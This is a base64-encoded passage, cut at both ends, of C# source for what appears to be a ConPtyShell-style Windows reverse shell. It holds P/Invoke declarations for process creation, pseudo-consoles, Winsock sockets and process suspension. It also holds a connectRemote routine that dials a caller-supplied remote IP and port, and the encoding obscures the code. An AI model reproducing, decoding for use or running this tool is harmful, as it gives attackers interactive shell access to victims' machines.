CBwdWJsaWMgSW50MzIgZHdYU2l6ZTsKICAgICAgICBwdWJsaWMgSW50MzIgZHdZU2l6ZTsKICAgICAgICBwdWJsaWMgSW50MzIgZHdYQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgSW50MzIgZHdZQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgSW50MzIgZHdGaWxsQXR0cmlidXRlOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd0ZsYWdzOwogICAgICAgIHB1YmxpYyBJbnQxNiB3U2hvd1dpbmRvdzsKICAgICAgICBwdWJsaWMgSW50MTYgY2JSZXNlcnZlZDI7CiAgICAgICAgcHVibGljIEludFB0ciBscFJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRJbnB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRPdXRwdXQ7CiAgICAgICAgcHVibGljIEludFB0ciBoU3RkRXJyb3I7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgUFJPQ0VTU19JTkZPUk1BVElPTgogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgaFByb2Nlc3M7CiAgICAgICAgcHVibGljIEludFB0ciBoVGhyZWFkOwogICAgICAgIHB1YmxpYyBpbnQgZHdQcm9jZXNzSWQ7CiAgICAgICAgcHVibGljIGludCBkd1RocmVhZElkOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFNFQ1VSSVRZX0FUVFJJQlVURVMKICAgIHsKICAgICAgICBwdWJsaWMgaW50IG5MZW5ndGg7CiAgICAgICAgcHVibGljIEludFB0ciBscFNlY3VyaXR5RGVzY3JpcHRvcjsKICAgICAgICBwdWJsaWMgaW50IGJJbmhlcml0SGFuZGxlOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IENPT1JECiAgICB7CiAgICAgICAgcHVibGljIHNob3J0IFg7CiAgICAgICAgcHVibGljIHNob3J0IFk7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgV1NBRGF0YQogICAgewogICAgICAgIHB1YmxpYyBzaG9ydCB3VmVyc2lvbjsKICAgICAgICBwdWJsaWMgc2hvcnQgd0hpZ2hWZXJzaW9uOwogICAgICAgIHB1YmxpYyBzaG9ydCBpTWF4U29ja2V0czsKICAgICAgICBwdWJsaWMgc2hvcnQgaU1heFVkcERnOwogICAgICAgIHB1YmxpYyBJbnRQdHIgbHBWZW5kb3JJbmZvOwogICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRTdHIsIFNpemVDb25zdCA9IDI1NyldCiAgICAgICAgcHVibGljIHN0cmluZyBzekRlc2NyaXB0aW9uOwogICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRTdHIsIFNpemVDb25zdCA9IDEyOSldCiAgICAgICAgcHVibGljIHN0cmluZyBzelN5c3RlbVN0YXR1czsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBTT0NLQUREUl9JTgogICAgewogICAgICAgIHB1YmxpYyBzaG9ydCBzaW5fZmFtaWx5OwogICAgICAgIHB1YmxpYyBzaG9ydCBzaW5fcG9ydDsKICAgICAgICBwdWJsaWMgdWludCBzaW5fYWRkcjsKICAgICAgICBwdWJsaWMgbG9uZyBzaW5femVybzsKICAgIH0KCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgSW5pdGlhbGl6ZVByb2NUaHJlYWRBdHRyaWJ1dGVMaXN0KEludFB0ciBscEF0dHJpYnV0ZUxpc3QsIGludCBkd0F0dHJpYnV0ZUNvdW50LCBpbnQgZHdGbGFncywgcmVmIEludFB0ciBscFNpemUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBVcGRhdGVQcm9jVGhyZWFkQXR0cmlidXRlKEludFB0ciBscEF0dHJpYnV0ZUxpc3QsIHVpbnQgZHdGbGFncywgSW50UHRyIGF0dHJpYnV0ZSwgSW50UHRyIGxwVmFsdWUsIEludFB0ciBjYlNpemUsIEludFB0ciBscFByZXZpb3VzVmFsdWUsIEludFB0ciBscFJldHVyblNpemUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIEVudHJ5UG9pbnQgPSAiQ3JlYXRlUHJvY2VzcyIpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVhdGVQcm9jZXNzRXgoc3RyaW5nIGxwQXBwbGljYXRpb25OYW1lLCBzdHJpbmcgbHBDb21tYW5kTGluZSwgcmVmIFNFQ1VSSVRZX0FUVFJJQlVURVMgbHBQcm9jZXNzQXR0cmlidXRlcywgcmVmIFNFQ1VSSVRZX0FUVFJJQlVURVMgbHBUaHJlYWRBdHRyaWJ1dGVzLCBib29sIGJJbmhlcml0SGFuZGxlcywgdWludCBkd0NyZWF0aW9uRmxhZ3MsIEludFB0ciBscEVudmlyb25tZW50LCBzdHJpbmcgbHBDdXJyZW50RGlyZWN0b3J5LCBbSW5dIHJlZiBTVEFSVFVQSU5GT0VYIGxwU3RhcnR1cEluZm8sIG91dCBQUk9DRVNTX0lORk9STUFUSU9OIGxwUHJvY2Vzc0luZm9ybWF0aW9uKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBFbnRyeVBvaW50ID0gIkNyZWF0ZVByb2Nlc3MiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3Moc3RyaW5nIGxwQXBwbGljYXRpb25OYW1lLCBzdHJpbmcgbHBDb21tYW5kTGluZSwgSW50UHRyIGxwUHJvY2Vzc0F0dHJpYnV0ZXMsIEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsIGJvb2wgYkluaGVyaXRIYW5kbGVzLCB1aW50IGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxwRW52aXJvbm1lbnQsIHN0cmluZyBscEN1cnJlbnREaXJlY3RvcnksIFtJbl0gcmVmIFNUQVJUVVBJTkZPIGxwU3RhcnR1cEluZm8sIG91dCBQUk9DRVNTX0lORk9STUFUSU9OIGxwUHJvY2Vzc0luZm9ybWF0aW9uKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgVGVybWluYXRlUHJvY2VzcyhJbnRQdHIgaFByb2Nlc3MsIHVpbnQgdUV4aXRDb2RlKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBVSW50MzIgV2FpdEZvclNpbmdsZU9iamVjdChJbnRQdHIgaEhhbmRsZSwgVUludDMyIGR3TWlsbGlzZWNvbmRzKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFNldFN0ZEhhbmRsZShpbnQgblN0ZEhhbmRsZSwgSW50UHRyIGhIYW5kbGUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRTdGRIYW5kbGUoaW50IG5TdGRIYW5kbGUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoSW50UHRyIGhPYmplY3QpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUGlwZShvdXQgSW50UHRyIGhSZWFkUGlwZSwgb3V0IEludFB0ciBoV3JpdGVQaXBlLCByZWYgU0VDVVJJVFlfQVRUUklCVVRFUyBscFBpcGVBdHRyaWJ1dGVzLCBpbnQgblNpemUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIENhbGxpbmdDb252ZW50aW9uID0gQ2FsbGluZ0NvbnZlbnRpb24uU3RkQ2FsbCwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZUZpbGUoc3RyaW5nIGxwRmlsZU5hbWUsIHVpbnQgZHdEZXNpcmVkQWNjZXNzLCB1aW50IGR3U2hhcmVNb2RlLCBJbnRQdHIgU2VjdXJpdHlBdHRyaWJ1dGVzLCB1aW50IGR3Q3JlYXRpb25EaXNwb3NpdGlvbiwgdWludCBkd0ZsYWdzQW5kQXR0cmlidXRlcywgSW50UHRyIGhUZW1wbGF0ZUZpbGUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgUmVhZEZpbGUoSW50UHRyIGhGaWxlLCBbT3V0XSBieXRlW10gbHBCdWZmZXIsIHVpbnQgbk51bWJlck9mQnl0ZXNUb1JlYWQsIG91dCB1aW50IGxwTnVtYmVyT2ZCeXRlc1JlYWQsIEludFB0ciBscE92ZXJsYXBwZWQpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgV3JpdGVGaWxlKEludFB0ciBoRmlsZSwgYnl0ZVtdIGxwQnVmZmVyLCB1aW50IG5OdW1iZXJPZkJ5dGVzVG9Xcml0ZSwgb3V0IHVpbnQgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbiwgSW50UHRyIGxwT3ZlcmxhcHBlZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IENyZWF0ZVBzZXVkb0NvbnNvbGUoQ09PUkQgc2l6ZSwgSW50UHRyIGhJbnB1dCwgSW50UHRyIGhPdXRwdXQsIHVpbnQgZHdGbGFncywgb3V0IEludFB0ciBwaFBDKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgQ2xvc2VQc2V1ZG9Db25zb2xlKEludFB0ciBoUEMpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0Q29uc29sZU1vZGUoSW50UHRyIGhDb25zb2xlSGFuZGxlLCB1aW50IG1vZGUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgR2V0Q29uc29sZU1vZGUoSW50UHRyIGhhbmRsZSwgb3V0IHVpbnQgbW9kZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIEFsbG9jQ29uc29sZSgpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIEV4YWN0U3BlbGxpbmcgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIEZyZWVDb25zb2xlKCk7CgogICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgU2hvd1dpbmRvdyhJbnRQdHIgaFduZCwgaW50IG5DbWRTaG93KTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q29uc29sZVdpbmRvdygpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW5kbGUoc3RyaW5nIGxwTW9kdWxlTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgV1NBU29ja2V0KFtJbl0gQWRkcmVzc0ZhbWlseSBhZGRyZXNzRmFtaWx5LCBbSW5dIFNvY2tldFR5cGUgc29ja2V0VHlwZSwgW0luXSBQcm90b2NvbFR5cGUgcHJvdG9jb2xUeXBlLCBbSW5dIEludFB0ciBwcm90b2NvbEluZm8sIFtJbl0gdWludCBncm91cCwgW0luXSBpbnQgZmxhZ3MpOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgY29ubmVjdChJbnRQdHIgcywgcmVmIFNPQ0tBRERSX0lOIGFkZHIsIGludCBhZGRyc2l6ZSk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIHVzaG9ydCBodG9ucyh1c2hvcnQgaG9zdHNob3J0KTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQW5zaSwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdWludCBpbmV0X2FkZHIoc3RyaW5nIGNwKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50MzIgV1NBR2V0TGFzdEVycm9yKCk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludDMyIFdTQVN0YXJ0dXAoSW50MTYgd1ZlcnNpb25SZXF1ZXN0ZWQsIG91dCBXU0FEYXRhIHdzYURhdGEpOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgY2xvc2Vzb2NrZXQoSW50UHRyIHMpOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgcmVjdihJbnRQdHIgU29ja2V0LCBieXRlW10gYnVmLCBpbnQgbGVuLCB1aW50IGZsYWdzKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IHNlbmQoSW50UHRyIFNvY2tldCwgYnl0ZVtdIGJ1ZiwgaW50IGxlbiwgdWludCBmbGFncyk7CgogICAgW0RsbEltcG9ydCgiV1MyXzMyLkRMTCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBXU0FDcmVhdGVFdmVudCgpOwoKICAgIFtEbGxJbXBvcnQoIldTMl8zMi5ETEwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgV1NBRXZlbnRTZWxlY3QoSW50UHRyIHMsIEludFB0ciBoRXZlbnRPYmplY3QsIGludCBsTmV0d29ya0V2ZW50cyk7CgogICAgW0RsbEltcG9ydCgiV1MyXzMyLkRMTCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBXU0FXYWl0Rm9yTXVsdGlwbGVFdmVudHMoaW50IGNFdmVudHMsIEludFB0cltdIGxwaEV2ZW50cywgYm9vbCBmV2FpdEFsbCwgaW50IGR3VGltZW91dCwgYm9vbCBmQWxlcnRhYmxlKTsKCiAgICBbRGxsSW1wb3J0KCJXUzJfMzIuRExMIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBXU0FSZXNldEV2ZW50KEludFB0ciBoRXZlbnQpOwoKICAgIFtEbGxJbXBvcnQoIldTMl8zMi5ETEwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFdTQUNsb3NlRXZlbnQoSW50UHRyIGhFdmVudCk7CgogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdWludCBOdFN1c3BlbmRQcm9jZXNzKEludFB0ciBwcm9jZXNzSGFuZGxlKTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IE50UmVzdW1lUHJvY2VzcyhJbnRQdHIgcHJvY2Vzc0hhbmRsZSk7CgogICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBJbml0V1NBVGhyZWFkKCkKICAgIHsKICAgICAgICBXU0FEYXRhIGRhdGE7CiAgICAgICAgaWYgKFdTQVN0YXJ0dXAoMiA8PCA4IHwgMiwgb3V0IGRhdGEpICE9IDApCiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbihTdHJpbmcuRm9ybWF0KCJXU0FTdGFydHVwIGZhaWxlZCB3aXRoIGVycm9yIGNvZGU6IHswfSIsIFdTQUdldExhc3RFcnJvcigpKSk7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgSW50UHRyIGNvbm5lY3RSZW1vdGUoc3RyaW5nIHJlbW90ZUlwLCBpbnQgcmVtb3RlUG9ydCkKICAgIHsKICAgICAgICBpbnQgcG9ydCA9IDA7CiAgICAgICAgaW50IGVycm9yID0gMDsKICAgICAgICBzdHJpbmcgaG9zdCA9IHJlbW90ZUlwOwoKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIHBvcnQgPSBDb252ZXJ0LlRvSW50MzIocmVtb3RlUG9ydCk7CiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oIlNwZWNpZmllZCBwb3J0IGlzIGludmFsaWQ6ICIgKyByZW1vdGVQb3J0LlRvU3RyaW5nKCkpOwogICAgICAgIH0KCiAgICAgICAgSW50UHRyIHNvY2tldCA9IEludFB0ci5aZXJvOwogICAgICAgIHNvY2tldCA9IFdTQVNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5JUCwgSW50UHRyLlplcm8sIDAsIFdTQV9GTEFHX09WRVJMQVBQRUQpOwogICAgICAgIFNPQ0tBRERSX0lOIHNvY2tpbmZvID0gbmV3IFNPQ0tBRERSX0lOKCk7CiAgICAgICAgc29ja2luZm8uc2luX2ZhbWlseSA9IChzaG9ydCkyOwogICAgICAgIHNvY2tpbmZvLnNpbl9hZGRyID0gaW5ldF9hZGRyKGhvc3QpOwogICAgICAgIHNvY2tpbmZvLnNpbl9wb3J0ID0gKHNob3J0KWh0b25zKCh1c2hvcnQpcG9ydCk7CgogICAgICAgIGlmIChjb25uZWN0KHNvY2tldCwgcmVmIHNvY2tpbmZvLCBNYXJzaGFsLlNpemVPZihzb2NraW5mbykpICE9IDApCiAgICAgICAgewogICAgICAgICAgICBlcnJvciA9IFdTQUdldExhc3RFcnJvcigpOwogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oU3RyaW5nLkZvcm1hdCgiV1NBQ29ubmVjdCBmYWlsZWQgd2l0aCBlcnJvciBjb2RlOiB7MH0iLCBlcnJvcikpOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHNvY2tldDsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIFRyeVBhcnNlUm93c0NvbHNGcm9tU29ja2V0KEludFB0ciBzaGVsbFNvY2tldCwgcmVmIHVpbnQgcm93cywgcmVmIHVpbnQgY29scykKICAgIHsKICAgICAgICBUaHJlYWQuU2xlZXAoNTAwKTsvL2xpdHRsZSB0d2VhayBmb3Igc2xvd2VyIGNvbm5lY3Rpb25zCiAgICAgICAgYnl0ZVtdIHJlY2VpdmVkID0gbmV3IGJ5dGVbMTAwXTsKICAgICAgICBpbnQgcm93c1RlbXAsIGNvbHNUZW1wOwogICAgICAgIGludCBieXRlc1JlY2VpdmVkID0gcmVjdihzaGVsbFNvY2tldCwgcmVjZWl2ZWQsIDEwMCwgMCk7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBzdHJpbmcgc2l6ZVJlY2VpdmVkID0gRW5jb2RpbmcuQVNDSUkuR2V0U3RyaW5nKHJlY2VpdmVkLCAwLCBieXRlc1JlY2VpdmVkKTsKICAgICAgICAgICAgc3RyaW5nIHJvd3NTdHJpbmcgPSBzaXplUmVjZWl2ZWQuU3BsaXQoJyAnKVswXS5UcmltKCk7CiAgICAgICAgICAgIHN0cmluZyBjb2xzU3RyaW5nID0gc2l6ZVJlY2VpdmVkLlNwbGl0KCcgJylbMV0uVHJpbSgpOwogICAgICAgICAgICBpZiAoSW50MzIuVHJ5UGFyc2Uocm93c1N0cmluZywgb3V0IHJvd3NUZW1wKSAmJiBJbnQzMi5UcnlQYXJzZShjb2xzU3RyaW5nLCBvdXQgY29sc1RlbXApKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICByb3dzID0gKHVpbnQpcm93c1RlbXA7CiAgICAgICAgICAgICAgICBjb2xzID0gKHVpbnQpY29sc1RlbXA7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBDcmVhdGVQaXBlcyhyZWYgSW50UHRyIElucHV0UGlwZVJlYWQsIHJlZiBJbnRQdHIgSW5wdXRQaXBlV3JpdGUsIHJlZiBJbnRQdHIgT3V0cHV0UGlwZVJlYWQsIHJlZiBJbnRQdHIgT3V0cHV0UGlwZVdyaXRlKQogICAgewogICAgICAgIFNFQ1VSSVRZX0FUVFJJQlVURVMgcFNlYyA9IG5ldyBTRUNVUklUWV9BVFRSSUJVVEVTKCk7CiAgICAgICAgcFNlYy5uTGVuZ3RoID0gTWFyc2hhbC5TaXplT2YocFNlYyk7CiAgICAgICAgcFNlYy5iSW5oZXJpdEhhbmRsZSA9IDE7CiAgICAgICAgcFNlYy5scFNlY3VyaXR5RGVzY3JpcHRvciA9IEludFB0ci5aZXJvOwogICAgICAgIGlmICghQ3JlYXRlUGlwZShvdXQgSW5wdXRQaXBlUmVhZCwgb3V0IElucHV0UGlwZVdyaXRlLCByZWYgcFNlYywgQlVGRkVSX1NJWkVfUElQRSkpCiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiQ291bGQgbm90IGNyZWF0ZSB0aGUgSW5wdXRQaXBlIik7CiAgICAgICAgaWYgKCFDcmVhdGVQaXBlKG91dCBPdXRwdXRQaXBlUmVhZCwgb3V0IE91dHB1dFBpcGVXcml0ZSwgcmVmIHBTZWMsIEJVRkZFUl9TSVpFX1BJUEUpKQogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oIkNvdWxkIG5vdCBjcmVhdGUgdGhlIE91dHB1dFBpcGUiKTsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIEluaXRDb25zb2xlKHJlZiBJbnRQdHIgb2xkU3RkSW4sIHJlZiBJbnRQdHIgb2xkU3RkT3V0LCByZWYgSW50UHRyIG9sZFN0ZEVycikKICAgIHsKICAgICAgICBvbGRTdGRJbiA9IEdldFN0ZEhhbmRsZShTVERfSU5QVVRfSEFORExFKTsKICAgICAgICBvbGRTdGRPdXQgPSBHZXRTdGRIYW5kbGUoU1REX09VVFBVVF9IQU5ETEUpOwogICAgICAgIG9sZFN0ZEVyciA9IEdldFN0ZEhhbmRsZShTVERfRVJST1JfSEFORExFKTsKICAgICAgICBJbnRQdHIgaFN0ZG91dCA9IENyZWF0ZUZpbGUoIkNPTk9VVCQiLCBHRU5FUklDX1JFQUQgfCBHRU5FUklDX1dSSVRFLCBGSUxFX1NIQVJFX1JFQUQgfCBGSUxFX1NIQVJFX1dSSVRFLCBJbnRQdHIuWmVybywgT1BFTl9FWElTVElORywgRklMRV9BVFRSSUJVVEVfTk9STUFMLCBJbnRQdHIuWmVybyk7CiAgICAgICAgSW50UHRyIGhTdGRpbiA9IENyZWF0ZUZpbGUoIkNPTklOJCIsIEdFTkVSSUNfUkVBRCB8IEdFTkVSSUNfV1JJVEUsIEZJTEVfU0hBUkVfUkVBRCB8IEZJTEVfU0hBUkVfV1JJVEUsIEludFB0ci5aZXJvLCBPUEVOX0VYSVNUSU5HLCBGSUxFX0FUVFJJQlVURV9OT1JNQUwsIEludFB0ci5aZXJvKTsKICAgICAgICBTZXRTdGRIYW5kbGUoU1REX09VVFBVVF9IQU5ETEUsIGhTdGRvdXQpOwogICAgICAgIFNldFN0ZEhhbmRsZShTVERfRVJST1JfSEFORExFLCBoU3Rkb3V0KTsKICAgICAgICBTZXRTdGRIYW5kbGUoU1REX0lOUFVUX0hBTkRMRSwgaFN0ZGluKTsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIFJlc3RvcmVTdGRIYW5kbGVzKEludFB0ciBvbGRTdGRJbiwgSW50UHRyIG9sZFN0ZE91dCwgSW50UHRyIG9sZFN0ZEVycikKICAgIHsKICAgI